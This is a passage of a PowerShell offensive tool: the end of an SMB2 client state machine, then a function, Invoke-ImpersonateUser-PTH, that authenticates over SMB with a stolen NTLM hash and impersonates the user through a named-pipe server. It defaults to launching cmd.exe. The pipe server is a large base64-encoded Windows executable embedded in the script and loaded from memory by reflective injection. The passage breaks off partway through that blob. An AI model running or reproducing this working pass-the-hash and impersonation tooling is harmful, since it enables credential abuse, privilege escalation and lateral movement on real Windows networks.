                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }


                        'ReadRequest'
                        {
                            Start-Sleep -m $Sleep
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                            $stage = 'SendReceive'
                        }

                        'SendReceive'
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }


                        'StatusPending'
                        {
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                            {
                                $stage = 'StatusReceived'
                            }
                            else{write-verbose "not received yet"}

                        }

                        'StatusReceived'
                        {

                            switch ($stage_current)
                            {

                                'CloseRequest'
                                {
                                    $stage = 'TreeDisconnect'
                                }

                                'CloseServiceHandle'
                                {

                                    if($SMB_close_service_handle_stage -eq 2)
                                    {
                                        $stage = 'CloseServiceHandle'
                                    }
                                    else
                                    {
                                        $stage = 'CloseRequest'
                                    }

                                }

                                'CreateRequest'
                                {
                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')
                                    {
                                        Write-Output "[+] Session refreshed"
                                        $stage = 'Exit'
                                    }
                                    elseif($stage -ne 'Exit')
                                    {
                                        $stage = 'TreeDisconnect' # changed from RPCBind
                                    }

                                }

                                'Logoff'
                                {
                                    $stage = 'Exit'
                                }


                                'ReadRequest'
                                {
                                    $stage = $stage_next
                                }


                                'TreeConnect'
                                {
                                    $tree_ID = $client_receive[40..43]
                                    $stage = 'CreateRequest'
                                }

                                'TreeDisconnect'
                                {

                                    if(!$Logoff)
                                    {
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $stage = 'Logoff'
                                    }

                                }

                            }

                        }
                    
                        'TreeConnect'
                        {
                            $tree_ID = $client_receive[40..43]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            Write-verbose "TreeConnect send!"
                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }
                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }
                            
                        }

                        'TreeDisconnect'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }
    
                    }
                
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }
        
        }

    }

}

}

function Invoke-ImpersonateUser-PTH
{
<#
.SYNOPSIS
Invoke-ImpersonateUser-PTH is a combination of a modified Invoke-SMBExec (https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) and a modified RoguePotato (https://github.com/antonioCoco/RoguePotato) Pipeserver
with the aim of User-Impersonation via PTH over a named pipe. Invoke-ReflectivePEInjection (https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) is used to load the Pipeserver from memory.

Author: Fabian Mosch (@shitsecure)
License: BSD 3-Clause

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER PipeName
The named pipe to access.

.PARAMETER Binary
The full path to an executable.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.


#>


[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target = "localhost",
    [parameter(Mandatory=$false)][String]$binary = "C:\windows\system32\cmd.exe",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain = "$env:computername",
    [parameter(Mandatory=$false)][switch]$RDP,
    [parameter(Mandatory=$false)][String]$PipeName,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash

)

    @'
             
         __   ___  __   __   __            ___  ___       __   ___  __      __  ___      
|  |\/| |__) |__  |__) /__` /  \ |\ |  /\   |  |__  |  | /__` |__  |__) __ |__)  |  |__| 
|  |  | |    |___ |  \ .__/ \__/ | \| /~~\  |  |___ \__/ .__/ |___ |  \    |     |  |  | 
                                                                                         
                                               by @shitsecure
'@


$decoded = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEDIqegAAAAAAAAAAOAAIiALATAAAFwAAAAIAAAAAAAAlnoAAAAgAAAAgAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADAAAAAAgAAZV8BAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAEF6AABPAAAAAIAAAIQEAAAAAAAAAAAAAABmAAB4IwAAAKAAAAwAAABgeQAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAnFoAAAAgAAAAXAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIQEAAAAgAAAAAYAAABeAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAKAAAAACAAAAZAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAB1egAAAAAAAEgAAAACAAUAeDQAAHhAAAABAAAAAAAAAPB0AABwBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CewcAAAQqIgIDfQcAAAQqHgJ7CAAABCoiAgN9CAAABCoeAnsJAAAEKiICA30JAAAEKh4CewoAAAQqIgIDfQoAAAQqHgJ7CwAABCoiAgN9CwAABCoeAnsMAAAEKiICA30MAAAEKh4Cew0AAAQqIgIDfQ0AAAQqHgJ7DgAABCoiAgN9DgAABCobMAIAWQAAAAAAAAACKBoAAAoCKBsAAApyAQAAcG8cAAAKLBMCAigBAAAGbx0AAAp9AgAABCsMAgIoAwAABn0CAAAEAAICKB4AAApvHwAACm8gAAAKbyEAAAp9AwAABN4DJt4AKgAAAAEQAAAAADgAHVUAAxoAAAETMAsA2AAAAAAAAAACKCIAAAoCewEAAAQ6rQAAAAIoDwAABixEAgIoBQAABgJ7AgAABAIoAQAABgIoAwAABgIoBwAABgIoCwAABgIoCQAABgICewMAAAQCKA8AAAZzMwAABn0EAAAEKzwCAigFAAAGAnsCAAAEAigBAAAGAigDAAAGAigHAAAGAigLAAAGAigJAAAGAgJ7AwAABHMyAAAGfQQAAAQCewQAAAQCKA0AAAYoNwAABgICewQAAAQoIwAACgIXfQEAAAQqAigJAAAGLBECewQAAAQCKAkAAAZvNQAABipKAigkAAAKAnsEAAAEbzYAAAYqHgIoJQAACip2AigmAAAKAnIZAABwKCcAAAoCcygAAAp9DwAABCoAAAATMAMANQAAAAEAABEDbykAAAoWbyoAAAoWbysAAApvLAAACnUFAAACCgYsEwJ7DwAABAZvLQAACgZvLgAACiYGKkYCew8AAARvLwAACigBAAArKgAbMAMATAAAAAIAABFzMQAACgoCew8AAARvLwAACm8yAAAKCysdB28zAAAKDAhvNAAACgMbbzUAAAosBwYIbzYAAAoHbzcAAAot294KBywGB284AAAK3AYqARAAAAIAFwApQAAKAAAAABswAwBMAAAAAgAAEXMxAAAKCgJ7DwAABG8vAAAKbzIAAAoLKx0HbzMAAAoMCG85AAAKAxtvNQAACiwHBghvNgAACgdvNwAACi3b3goHLAYHbzgAAArcBioBEAAAAgAXAClAAAoAAAAAEzADABQAAAADAAARAnsPAAAEAxIAbzoAAAosAgYqFCobMAIAPwAAAAQAABECew8AAARvLwAACm8yAAAKCisUBm8zAAAKCwdvOwAACgMzBAcM3hYGbzcAAAot5N4KBiwGBm84AAAK3BQqCCoAARAAAAIAEQAgMQAKAAAAABswAgBLAAAAAgAAEXMxAAAKCgJ7DwAABG8vAAAKbzIAAAoLKxwHbzMAAAoMCG88AAAKbz0AAAoDMwcGCG82AAAKB283AAAKLdzeCgcsBgdvOAAACtwGKgABEAAAAgAXACg/AAoAAAAAGnM+AAAKegATMAMAMAAAAAMAABECew8AAAQDby0AAAoSAG86AAAKLBoGbz8AAAoCew8AAAQDby0AAAoSAG9AAAAKJioeAihBAAAKKhMwAwBaAAAAAAAAAAIoQQAACgMtC3JHAABwc0IAAAp6AgN9EAAABAIEJS0GJn5DAAAKfREAAAQCexAAAAQC/gYsAAAG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